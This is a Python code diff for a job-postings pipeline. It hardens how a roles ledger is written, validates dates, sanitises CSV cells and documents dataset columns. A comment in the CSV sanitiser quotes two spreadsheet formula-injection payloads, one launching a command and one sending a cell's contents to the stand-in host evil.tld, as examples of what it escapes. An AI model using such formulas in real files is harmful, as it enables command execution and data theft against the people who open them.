@@ -148,7 +148,7 @@ class LedgerShrink(Exception):
     """A write that would remove records from a ledger file. Never performed."""
 
 
-def dump(path, records, allow_shrink=False):
+def dump(path, records, allow_shrink=False, may_drop=()):
     """Atomic, sorted, one line per role, keys sorted — the diff is the change.
 
     RETENTION IS THE PRODUCT NOW. Every closed role is history the operator cannot buy
@@ -159,22 +159,38 @@ def dump(path, records, allow_shrink=False):
     deletion anybody asked for. Refuse it and keep the file.
 
     This is the one choke point: `Ledger.flush` and `stamp_sent` are the only writers and
-    both come through here. It is deliberately a COUNT and not a key-set check, because the
-    legitimate shrink-shaped events all keep the count — a purge changes `status`, a
-    supersede changes `status`, `merge_duplicates` runs before anything is recorded.
+    both come through here.
 
-    What it does NOT protect against, said plainly: the wholesale restore path in
-    `daily-digest.yml` (`cp -rT`), which replaces the file without going through this
-    function at all (docs/BACKLOG.md 125/160). `allow_shrink=True` exists for the one
-    caller that legitimately rewrites a file from scratch — a repair tool, never the run.
+    It checks the KEY SET, not the count. A count was the first version and an adversarial
+    pass took it apart in two moves: one unreadable line plus one new role that morning nets
+    to zero (`load` drops the bad line below `CORRUPT_FRAC` and reports `ok`, the absorption
+    hides the shortfall, and the role is gone with only a `skipped 1 unreadable line(s)`
+    line that does not name it); and a bare substitution — one role_id out, another in —
+    never moves the count at all. Where sqlite still holds the row it comes back as
+    `_fresh`, so `episodes`, `sent`, `emailed_on`, `class`, `tags`, `reposts` and the
+    ledger-only `status` are gone even though the count says nothing was lost.
+
+    `may_drop` is for the one caller that removes keys on purpose: `flush` prunes
+    `roles_text.jsonl` to the records that still exist, and without an exemption a single
+    orphaned text key — the `cp -rT` restore pairing an older `roles.jsonl` with a newer
+    text file — would refuse EVERY future write of the descriptions file, for ever. That is
+    the guard causing a new outage, which is worse than the one it prevents.
+
+    What it does NOT protect against, said plainly: that same wholesale restore path in
+    `daily-digest.yml`, which replaces the file without going through this function at all
+    (docs/BACKLOG.md 125/160). `allow_shrink=True` exists for a repair tool that rebuilds a
+    file from scratch, never for the run.
     """
     if not allow_shrink and os.path.exists(path):
         have, status, _bad = load(path)
         # a corrupt file is not a baseline to measure against — `load` already refuses to
         # let one be read, and its `{}` must not read here as "the file was empty"
-        if status == "ok" and len(records) < len(have):
-            raise LedgerShrink(f"{os.path.basename(path)}: refusing to write "
-                               f"{len(records)} records over {len(have)}")
+        lost = (set(have) - set(records) - set(may_drop)) if status == "ok" else set()
+        if lost:
+            raise LedgerShrink(
+                f"{os.path.basename(path)}: refusing to write {len(records)} records over "
+                f"{len(have)} — {len(lost)} would be lost, e.g. "
+                f"{', '.join(sorted(lost)[:3])}")
 
     def _w(f):
         for rid in sorted(records):
@@ -288,7 +304,28 @@ def tenant_slug(url):
 # reconcile (pure): one sqlite row vs one ledger record, field by field
 # --------------------------------------------------------------------------- #
 def _iso(s):
-    return bool(_ISO.match(str(s or "")))
+    """Is this a date this module may hand to `dt.date.fromisoformat` without raising?
+
+    The shape test alone said yes to `2026-08-32`, `2026-13-01`, `2026-02-30` and
+    `0000-00-00` — and `0000-00-00` is the standard MySQL/ATS null-date sentinel, so it is
+    one board away, not a thought experiment. Both upstream normalisers pass such a string
+    through untouched (their fallback keeps `s[:10]` whenever `s[4] == "-"`), and
+    `_record_run`'s repost check calls `fromisoformat` behind this predicate alone: one bad
+    date on one board therefore took `record_run` down, froze the ledger for the day, and
+    cost every status, closure and episode of that run. `_valid`'s docstring already
+    promises the opposite — "must freeze the ledger, not take the digest down" — but it
+    type-checks only, so a date TYPO sailed past it.
+
+    Found by an adversarial pass on 2026-08-30, reproduced end to end, and it predates this
+    session's work: the dataset only made it easier to hit."""
+    s = str(s or "")
+    if not _ISO.match(s):
+        return False
+    try:
+        dt.date.fromisoformat(s)
+    except ValueError:
+        return False
+    return True
 
 
 def _rowval(row, c):
@@ -1070,15 +1107,24 @@ class Ledger:
                 dump(self.path, out)
                 self.dirty = False
             if self.text_dirty and not self.text_frozen:
+                # the prune is deliberate — a description whose role no longer exists is
+                # not history, it is an orphan — so those keys are declared droppable and
+                # everything else still trips the guard
+                pruned = {k for k in self.text if k not in self.records}
                 self.text = {k: v for k, v in self.text.items() if k in self.records}
-                dump(self.text_path, self.text)
+                dump(self.text_path, self.text, may_drop=pruned)
                 self.text_dirty = False
             return True
         except LedgerShrink as e:
-            # louder than a write failure and differently caused: the bytes are fine, the
+            # Louder than a write failure and differently caused: the bytes are fine, the
             # RECORD SET is short. Yesterday's file stands and the day is still delivered.
-            self.alarms.append(f"roles ledger SHRINK refused ({e}) — the file on disk was "
-                               f"kept; nothing was deleted, and nothing was recorded either")
+            # It must say WHICH file: `flush` writes the record file first and clears
+            # `dirty`, so a refusal on the text dump used to report "nothing was recorded"
+            # about a run whose records had already landed in that same call.
+            landed = ("the record file had already been written this run"
+                      if not self.dirty else "nothing was recorded either")
+            self.alarms.append(f"roles ledger SHRINK refused ({e}) — that file on disk was "
+                               f"kept and nothing was deleted; {landed}")
             return False
         except Exception as e:  # noqa: BLE001
             self.alarms.append(f"roles ledger write failed: {e.__class__.__name__}: {str(e)[:80]}")
@@ -1100,18 +1146,18 @@ _CATS = ("bi", "query", "de", "pa", "prog", "method", "cloud", "lang")
 # (name, doc) — the doc reaches the reader through the meta file, so it is written for
 # somebody who has never seen this repo.
 _COLUMNS = [
-    ("role_id", "Stable id for the role: lowercased 'company|title'. Join key for roles_text.jsonl."),
+    ("role_id", "Opaque stable id for the role — a normalised slug derived from company and title (punctuation and corporate suffixes dropped), so DO NOT split it: use the company and title columns. It is the join key for roles_text.jsonl."),
     ("company", "Employer name as it appears on the board we read."),
     ("title", "Job title as posted."),
     ("location", "Location as posted (free text, usually an Israeli city)."),
     ("url", "The posting's own address on the employer's careers board."),
     ("status", "open = still on the employer's board at last_seen; closed = it was gone when we last looked."),
     ("posted_date", "The date the EMPLOYER states the role was posted. Empty when the board publishes none."),
-    ("first_seen", "The first day this pipeline saw the role. Not a posting date."),
+    ("first_seen", "The first day this pipeline ever saw the role, across all of its spells. Not a posting date."),
     ("last_seen", "The last day this pipeline saw the role on its board. The window column."),
     ("date_estimate", "Best available 'when did this role appear': posted_date if there is one, else first_seen."),
     ("date_basis", "Which date date_estimate came from, and how much to trust it."),
-    ("days_observed", "last_seen - first_seen + 1: days we OBSERVED it open, not days it was open."),
+    ("days_observed", "Days from the FIRST day we ever saw this role (across all its spells) to the last, inclusive. Days we observed it, not days it was open — we only see it when a scan runs."),
     ("closed_on", "The day we recorded it closed. Empty while open."),
     ("emailed", "true if this role went out in a daily digest email."),
     ("emailed_on", "The date it was first emailed. Empty if never emailed."),
@@ -1160,9 +1206,11 @@ _ENUMS = {
         "posted_date": "the employer published a date and we use it",
         "first_seen": "no published date; the day WE first saw it, which is an upper bound "
                       "on how old the posting is",
-        "first_seen_backfill": "no published date, AND this was the first day we ever "
-                               "scanned this employer, so the whole back catalogue arrived "
-                               "at once. first_seen says only 'not newer than this'.",
+        "first_seen_oldest_for_company": "no published date, AND this is the oldest sighting "
+                                         "we hold for this employer — so it may have arrived "
+                                         "as part of a back catalogue when we started "
+                                         "watching, rather than having been posted that day. "
+                                         "Treat the date as 'not newer than this' only.",
     },
     "seniority_title": {
         "senior": "the title says senior/lead/principal/staff (or the Hebrew equivalent)",
@@ -1179,6 +1227,53 @@ _ENUMS = {
     "class_decision": {"accept": "judged an analytics role in Israel", "reject": "judged not one"},
 }
 
+
+def _closed_vocabularies():
+    """The enums whose values live in another module, read from that module rather than
+    retyped here so the meta cannot drift from what `build_rows` actually emits.
+
+    An adversarial pass on 2026-08-30 found six closed vocabularies shipping with no `enum`
+    in the meta — `family` (8 values), `stage`, `size_band`, `degree_level`, `degree_fields`
+    and `ai` — while `track` (2 values) and `degree_status` (2) were documented, so the
+    omission was arbitrary rather than principled. Documenting every value of every enum is
+    the one job this meta file has.
+
+    Never raises: a vocabulary that cannot be imported is simply left undocumented rather
+    than taking the export down with it."""
+    out = {}
+    try:
+        from . import roleprofile
+        out["family"] = dict.fromkeys(
+            [f for f, _rx in roleprofile._FAMILIES] + ["Other"],
+            "role family, read from the title first and the opening of the description second")
+        out["family"]["Other"] = "an analytics role that fits none of the families above"
+        # AI_USAGE rows are (label, token, regex) and AI_DESC already holds the prose, so
+        # the meta says exactly what the board says — plus the label `classify_ai` invents
+        # for a mention it cannot place, which is in neither list.
+        desc = dict(getattr(roleprofile, "AI_DESC", {}) or {})
+        labels = [r[0] for r in getattr(roleprofile, "AI_USAGE", [])] + ["AI (unspecified)"]
+        out["ai"] = {lbl: desc.get(lbl, "how the posting expects AI to be used")
+                     for lbl in labels}
+        for name, key, prose in (
+                ("degree_level", "_DEG_LEVELS", "highest degree the posting names"),
+                ("degree_fields", "_DEG_FIELDS", "field of study named alongside the degree")):
+            rows_ = getattr(roleprofile, key, None)
+            if rows_:
+                out[name] = {r[0] if isinstance(r, (list, tuple)) else str(r): prose
+                             for r in rows_}
+    except Exception:  # noqa: BLE001
+        pass
+    try:
+        from . import firmographics as _fm
+        out["stage"] = dict.fromkeys(sorted(_fm.STAGES),
+                                     "company stage, as researched (firmographics)")
+        out["size_band"] = {
+            "S": "under 200 employees globally", "M": "200-1,000",
+            "L": "1,000-5,000", "XL": "over 5,000"}
+    except Exception:  # noqa: BLE001
+        pass
+    return {k: v for k, v in out.items() if v}
+
 _FIRMO_COLS = ("sector", "sub_sector", "stage", "stage_note", "size_band", "employees_global",
                "founded", "business_model", "customer_type", "il_center")
 
@@ -1194,15 +1289,95 @@ def dataset_paths(db_path):
             os.path.join(d, FUNNEL))
 
 
+# Characters that must never reach a cell. A NUL is the one that matters: `_clean` does not
+# strip it, json round-trips it through the ledger, and pandas' C parser then TRUNCATES the
+# cell at it without a warning while the csv module keeps the whole string — silent,
+# invisible disagreement between two readers of the same public file. R refuses the file
+# outright. The rest are stripped for the same reason a newline is: a cell is one line.
+_CTRL = re.compile(r"[\x00-\x1f\x7f]")
+# A leading =, +, - or @ makes Excel, LibreOffice and Google Sheets treat the cell as a
+# FORMULA — `=cmd|' /C calc'!A0` and `=HYPERLINK("http://evil.tld?x="&A1,…)` are the classic
+# shapes. Titles and locations come from an employer's own careers board, i.e. from outside
+# the trust boundary, and `fetchers._clean` only collapses whitespace. Zero occurrences in
+# today's 143 rows; this file is downloaded and opened in a spreadsheet by strangers, so
+# latent is not good enough.
+_FORMULA = ("=", "+", "@", "\t", "\r")
+
+
+def _cell(v):
+    """One CSV cell: no control characters, and never executable in a spreadsheet."""
+    if v is None:
+        return ""
+    if v is True or v is False:
+        return _b(v)
+    s = _CTRL.sub("", str(v))
+    if s[:1] in _FORMULA or (s[:1] == "-" and not _NUMERIC.match(s)):
+        s = "'" + s          # the spreadsheet convention for "this is text"
+    return s
+
+
+_NUMERIC = re.compile(r"^-?\d+(\.\d+)?$")
+
+
 def _j(values):
-    """Join a list onto the one separator, dropping empties. A value containing the
-    separator would make the column unparseable, so it is escaped to a comma — measured
-    zero occurrences across the vocabulary, and a test pins that."""
-    return SEP.join(str(v).replace(SEP, ",").strip() for v in (values or []) if str(v).strip())
+    """Join a list onto the one separator, dropping empties.
+
+    A value containing the separator would make the column unparseable, so it is escaped to
+    a comma — measured zero occurrences across the whole vocabulary, and a test pins that.
+
+    A bare STRING is wrapped rather than iterated: `_j("greenhouse")` used to return
+    `g;r;e;e;n;h;o;u;s;e`, a plausible-looking cell that no reader could tell from a real
+    list, and a scalar where a list is expected is exactly the shape a half-repaired ledger
+    line has. Anything that is not a string or a number is dropped rather than shipped as a
+    Python `repr`."""
+    if values is None:
+        return ""
+    if isinstance(values, (str, bytes)):
+        values = [values]
+    try:
+        items = list(values)
+    except TypeError:
+        return ""
+    out = []
+    for v in items:
+        if v is None or isinstance(v, (list, dict, tuple, set)):
+            continue
+        t = _CTRL.sub("", str(v)).replace(SEP, ",").strip()
+        if t:
+            out.append(t)
+    return SEP.join(out)
 
 
 def _b(x):
     return "true" if x else "false"
+
+
+def _host(url):
+    """The posting's hostname, or "" — never an exception.
+
+    `urlparse` RAISES `ValueError` on an unrendered template (`https://[[HOST]]/jobs/1`,
+    `//[tpl]/job`) or an unbalanced bracket, which is a routine scrape failure. Unguarded,
+    one such href in the ledger cost the whole day's dataset — and, because the poison sits
+    in the record, every day after it until a human edited the line by hand."""
+    try:
+        return urlparse(str(url or "")).netloc
+    except ValueError:
+        return ""
+
+
+def _int(v):
+    """An integer cell, or "" — `bool` is not one, and neither is a float or a repr.
+
+    `isinstance(v, int)` alone let `True` through into a documented integer column (it is an
+    `int` subclass) and turned `5999.5` into an empty cell, which the meta then counted as
+    "we do not hold this value" about a value we hold."""
+    if isinstance(v, bool) or v is None:
+        return ""
+    if isinstance(v, int):
+        return v
+    if isinstance(v, float) and v == int(v):
+        return int(v)
+    return ""
 
 
 def seniority_of(title):
@@ -1235,18 +1410,46 @@ def backfill_seniority(records):
     return changed
 
 
-def _company_first_scan(records):
-    """{company: the earliest first_seen we hold for it} — the ledger's own answer to the
-    question `run.py:seen_before` asks sqlite: had we ever scanned this employer before?
+def _earliest_seen(rec):
+    """The first day we ever saw this role, across ALL of its spells.
 
-    A role whose `first_seen` IS that date arrived on the company's first scan, together
-    with its whole back catalogue, so `first_seen` dates our LOOKING and not the posting.
-    `_posted_in` refuses to call such a role fresh; the dataset cannot refuse it — it is a
-    real open role — so it labels it instead."""
+    `first_seen` alone is the CURRENT spell's, because `store.upsert_matched` resets it when
+    a role reappears after having been absent — that reset is the rule the email window
+    re-alerts on, and the ledger keeps the earlier openings in `episodes` rather than undoing
+    it. Reading `first_seen` and ignoring `episodes` therefore reports a role we have watched
+    since 2026-08-16 as first seen on 2026-08-25 (measured: 5 companies, 14 records, on the
+    real ledger), which understates `days_observed` by up to 13 days and can make a
+    long-known employer look like a first scan."""
+    dates = [str(rec.get("first_seen") or "")[:10]]
+    eps = rec.get("episodes")
+    if isinstance(eps, list):
+        for e in eps:
+            if isinstance(e, dict):
+                dates.append(str(e.get("first_seen") or "")[:10])
+    good = sorted(d for d in dates if _iso(d))
+    return good[0] if good else ""
+
+
+def _company_earliest(records):
+    """{company: the earliest day we hold ANY sighting for it}.
+
+    This is deliberately NOT called "first scan", and the column it feeds was renamed for
+    the same reason. The first version claimed a role stamped this way arrived on "the first
+    day we ever SCANNED this employer" — and an adversarial pass checked that against the
+    registry's own notes and found it false for 8 of the 13 rows it labelled: HiBob's row
+    reads `re-audit 2026-08-21`, eight days before the `first_seen` this function called its
+    first scan. The ledger holds sightings of ROLES, not scans of BOARDS, so a company we
+    have watched for a week that simply had no matching opening until yesterday is
+    indistinguishable here from a board we met yesterday.
+
+    What it can honestly say is the weaker thing that is actually true: this role is the
+    oldest sighting we hold for this employer, so its `first_seen` may be the day a back
+    catalogue arrived rather than the day the role was posted. That is still the warning a
+    reader needs; it is just no longer dressed up as a fact about scanning."""
     out = {}
     for rec in records.values():
-        c, fs = rec.get("company") or "", str(rec.get("first_seen") or "")
-        if not _iso(fs):
+        c, fs = rec.get("company") or "", _earliest_seen(rec)
+        if not fs:
             continue
         if c not in out or fs < out[c]:
             out[c] = fs
@@ -1272,51 +1475,65 @@ def build_rows(records, *, run_date, firmographics=None, window_days=WINDOW_DAYS
     by_ident = {}
     for name, rec in firmographics.items():
         by_ident.setdefault(identity_key(name), rec)
-    first_scan = _company_first_scan(records)
+    earliest_for = _company_earliest(records)
     end = str(run_date)
-    start = (dt.date.fromisoformat(end) - dt.timedelta(days=window_days)).isoformat()
+    start = (dt.date.fromisoformat(end) - dt.timedelta(days=window_days - 1)).isoformat()
     counts = Counter()
     rows = []
     for rid in sorted(records):
         rec = records[rid]
+        if not isinstance(rec, dict):
+            counts["unreadable"] += 1
+            continue
         st_ = rec.get("status") or "open"
-        if st_ in ("superseded", "purged"):
-            counts[st_] += 1          # one row per ROLE: a double and a row that was never
-            continue                  # ours are both counted in the meta, never published
+        if st_ not in ("open", "closed"):
+            # one row per ROLE: a double (`superseded`) and a row that was never ours
+            # (`purged`) are both counted in the meta and neither is published. Any OTHER
+            # value is a corrupt record, not a status, and is counted apart rather than
+            # published as an undocumented enum value.
+            counts[st_ if st_ in ("superseded", "purged") else "unreadable"] += 1
+            continue
         ls = str(rec.get("last_seen") or "")[:10]
         if not _iso(ls):
             counts["undatable"] += 1
             continue
-        if ls < start:
+        if ls < start or ls > end:
             counts["outside_window"] += 1
             continue
         counts["rows"] += 1
-        fs = str(rec.get("first_seen") or "")[:10]
+        fs = _earliest_seen(rec)
         pd_ = str(rec.get("posted_date") or "")[:10]
         if _iso(pd_):
             basis, est = "posted_date", pd_
-        elif _iso(fs):
-            basis = ("first_seen_backfill" if first_scan.get(rec.get("company") or "") == fs
-                     else "first_seen")
+        elif fs:
+            basis = ("first_seen_oldest_for_company"
+                     if earliest_for.get(rec.get("company") or "") == fs else "first_seen")
             est = fs
         else:
             basis, est = "", ""
-        counts[f"basis:{basis or 'none'}"] += 1
+        counts["basis:" + (basis or "none")] += 1
         days = ""
-        if _iso(fs) and _iso(ls):
-            days = (dt.date.fromisoformat(ls) - dt.date.fromisoformat(fs)).days + 1
-        tags = rec.get("tags") or {}
-        skills = [s for s in (tags.get("skills") or []) if isinstance(s, list) and s]
-        degree = tags.get("degree") or {}
-        cls = rec.get("class") or {}
-        company = rec.get("company") or ""
+        if fs and _iso(ls):
+            # a record whose dates invert is corrupt, not a role open for -8 days
+            days = max(1, (dt.date.fromisoformat(ls) - dt.date.fromisoformat(fs)).days + 1)
+        tags = rec.get("tags")
+        tags = tags if isinstance(tags, dict) else {}
+        skills = [x for x in (tags.get("skills") or []) if isinstance(x, list) and x]
+        degree = tags.get("degree")
+        degree = degree if isinstance(degree, dict) else {}
+        cls = rec.get("class")
+        cls = cls if isinstance(cls, dict) else {}
+        eps = rec.get("episodes")
+        reposts = rec.get("reposts")
+        company = str(rec.get("company") or "")
         fm = firmographics.get(company)
-        match = "exact" if fm else ""
+        match = "exact" if fm is not None else ""
         if fm is None:
             fm = by_ident.get(identity_key(company))
-            match = "identity" if fm else "none"
-        fm = fm or {}
-        counts[f"firmo:{match}"] += 1
+            match = "identity" if fm is not None else "none"
+        fm = fm if isinstance(fm, dict) else {}
+        counts["firmo:" + match] += 1
+        dlen = _int(rec.get("desc_len"))
         row = {
             "role_id": rid,
             "company": company,
@@ -1333,39 +1550,43 @@ def build_rows(records, *, run_date, firmographics=None, window_days=WINDOW_DAYS
             "closed_on": str(rec.get("closed_on") or ""),
             "emailed": _b(rec.get("sent")),
             "emailed_on": str(rec.get("emailed_on") or ""),
-            "episodes": len(rec.get("episodes") or []),
-            "reposts": len(rec.get("reposts") or []),
-            "repost_dates": _j(rec.get("reposts")),
-            "sources": _j(sorted(rec.get("sources") or [])),
-            "host": urlparse(rec.get("url") or "").netloc,
+            "episodes": len(eps) if isinstance(eps, list) else "",
+            "reposts": len(reposts) if isinstance(reposts, list) else "",
+            "repost_dates": _j(reposts),
+            "sources": _j(sorted(str(x) for x in (rec.get("sources") or []) if x)
+                          if isinstance(rec.get("sources"), list) else rec.get("sources")),
+            "host": _host(rec.get("url")),
             "seniority_title": rec.get("seniority") or "",
-            "years_experience": tags.get("years") if isinstance(tags.get("years"), int) else "",
+            "years_experience": _int(tags.get("years")),
             "family": tags.get("family") or "",
             "track": tags.get("track") or "",
             "degree_level": degree.get("level") or "",
             "degree_status": degree.get("status") or "",
             "degree_fields": _j(degree.get("fields")),
             "ai": _j([a[0] for a in (tags.get("ai") or []) if isinstance(a, list) and a]),
-            "skills": _j([s[0] for s in skills]),
+            "skills": _j([x[0] for x in skills]),
             "class_decision": cls.get("decision") or "",
             "class_path": cls.get("path") or "",
-            "description_len": rec.get("desc_len") if isinstance(rec.get("desc_len"), int) else "",
+            "description_len": dlen,
+            # sha1("") is a real hash of nothing, and publishing it as a join key sends a
+            # reader to a line of roles_text.jsonl that does not exist. An empty cell means
+            # "we hold no text", which is what the conventions block promises it means.
+            "description_sha1": (rec.get("desc_sha1") or "") if dlen else "",
             # The capture cap is 6,000 characters in all three layers that touch the text
             # (fetchers, jdfill, the store), and it cuts mid-sentence — Amazon's ends "...If
             # you have a". The true length is already gone by the time it reaches the store,
             # so it cannot be reported; that a row IS cut can be, and silently shipping a
             # truncated public dataset is the one option that was never available.
-            "description_truncated": _b(rec.get("desc_len") == _store.DESC_MAX),
-            "description_sha1": rec.get("desc_sha1") or "",
+            "description_truncated": _b(dlen == _store.DESC_MAX),
             "firmo_as_of": fm.get("as_of") or "",
             "firmo_match": match,
         }
         for c in _FIRMO_COLS:
-            v = fm.get(c)
-            row[c] = "" if v is None else v
+            row[c] = fm.get(c)
         for c in _CATS:
-            row[f"skills_{c}"] = _j(sorted(s[0] for s in skills if len(s) > 1 and s[1] == c))
-        rows.append(row)
+            row["skills_" + c] = _j(sorted(x[0] for x in skills
+                                           if len(x) > 1 and x[1] == c))
+        rows.append({k: _cell(v) for k, v in row.items()})
     counts["window_start"], counts["window_end"] = start, end
     return rows, counts
 
@@ -1385,6 +1606,8 @@ def build_meta(rows, counts, records, *, run_date, window_days=WINDOW_DAYS, earl
     start, end = counts["window_start"], counts["window_end"]
     covered = earliest and earliest <= start
     nulls = {c: sum(1 for r in rows if str(r.get(c, "")) == "") for c in COLUMNS}
+    enums = dict(_closed_vocabularies())
+    enums.update(_ENUMS)          # a hand-written enum always wins over a derived one
     return {
         "dataset": DATASET,
         "download_url": DOWNLOAD_URL,
@@ -1398,8 +1621,12 @@ def build_meta(rows, counts, records, *, run_date, window_days=WINDOW_DAYS, earl
             "basis": "last_seen",
             "start": start,
             "end": end,
-            "rule": f"last_seen >= {start} (inclusive), i.e. the role was seen open on its "
-                    f"employer's board at some point in the window",
+            # BOTH edges, and the rule says so. The upper edge used to be unenforced and
+            # unmentioned: re-deriving the file with an older `--date` published a window
+            # ending 2026-08-20 while 128 of its 143 rows had been seen after that.
+            "rule": f"{start} <= last_seen <= {end}, both inclusive ({window_days} days) — "
+                    f"the role was seen open on its employer's own careers board on some "
+                    f"day in that range",
             "fully_covered": bool(covered),
             "note": (
                 "COVERED: the store's observations reach back to or before the window start."
@@ -1445,7 +1672,7 @@ def build_meta(rows, counts, records, *, run_date, window_days=WINDOW_DAYS, earl
                    "what": "one row per full daily run: postings fetched -> Israel -> judged "
                            "-> matched -> alive -> board -> emailed"},
         "columns": {c: {k: v for k, v in (("doc", doc), ("nulls", nulls[c]),
-                                          ("enum", _ENUMS.get(c))) if v is not None}
+                                          ("enum", enums.get(c))) if v is not None}
                     for c, doc in _COLUMNS},
     }
 
@@ -1455,11 +1682,21 @@ def write_dataset(csv_path, meta_path, rows, meta):
     from .atomic import _swap, write_json
 
     def _w(f):
-        w = csv.DictWriter(f, fieldnames=COLUMNS, extrasaction="raise",
+        # `restval` supplies a missing column; `extrasaction="raise"` catches an EXTRA one.
+        # Projecting the row onto COLUMNS first (the previous version) made the second guard
+        # dead code, so a column `build_rows` started producing and nobody registered would
+        # have vanished from the public file without a word.
+        w = csv.DictWriter(f, fieldnames=COLUMNS, extrasaction="raise", restval="",
                            lineterminator="\r\n")
         w.writeheader()
         for r in rows:
-            w.writerow({c: r.get(c, "") for c in COLUMNS})
+            w.writerow(r)
+    # The CSV first and the meta second, never the other way round. The two `os.replace`
+    # calls are not one transaction, so this orders the failure window rather than closing
+    # it: if one of the pair fails it must be the META that is stale, because
+    # `_dataset_alarm` compares its `run_date` against the run log and says so the next
+    # morning. A stale CSV under a fresh meta describes rows that are not there, and nothing
+    # in this repo would catch that.
     _swap(csv_path, _w)
     write_json(meta_path, meta)
 
@@ -1571,7 +1808,15 @@ def stamp_sent(db_path, marks):
         if n:
             dump(path, records)
         return n
-    except Exception:  # noqa: BLE001 — a bookkeeping mirror must never block delivery
+    except Exception as e:  # noqa: BLE001 — a bookkeeping mirror must never block delivery
+        # ...but never SILENTLY. This mirror's whole job is to be the thing a rollback reads
+        # so a delivered cohort is not emailed twice, and it used to return 0 — which is
+        # also what "nothing to mark" returns — for a refused write, a locked file or a full
+        # disk alike. sqlite's `sent` table is still the real dedup, so this is a warning
+        # and not a failure, but a mirror that goes missing must say so.
+        print(f"::warning::roles stamp_sent could not write the ledger mirror "
+              f"({e.__class__.__name__}: {str(e)[:100]}) — sqlite `sent` still holds the "
+              f"marks; a ledger rehydration would not", flush=True)
         return 0
 
 
